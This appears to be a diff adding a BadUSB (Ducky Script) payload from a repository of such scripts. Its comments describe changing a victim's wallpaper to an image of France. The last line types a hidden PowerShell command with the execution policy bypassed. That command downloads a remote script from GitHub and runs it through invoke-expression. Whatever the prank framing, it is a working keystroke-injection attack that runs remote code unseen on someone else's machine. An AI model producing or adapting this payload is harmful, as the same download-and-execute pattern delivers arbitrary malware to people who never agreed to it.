@@ -1,0 +1,18 @@
+REM ------------------------------------
+REM Description: Changes wallpaper to a France image
+REM Author: P-ict0 (https://github.com/P-ict0)
+REM ------------------------------------
+REM This script:
+REM 1. Opens a powershell terminal
+REM 2. Fetches an image from this repo
+REM 3. Fetches a script from this repo to get the image and change the wallpaper
+REM 4. Removes the image 
+REM ------------------------------------
+
+DELAY 100
+
+GUI r
+DELAY 200
+
+REM Download and run script
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/P-ict0/BadUSB-Scripts/main/helpers/francer/francer.ps1?dl=1; invoke-expression $pl
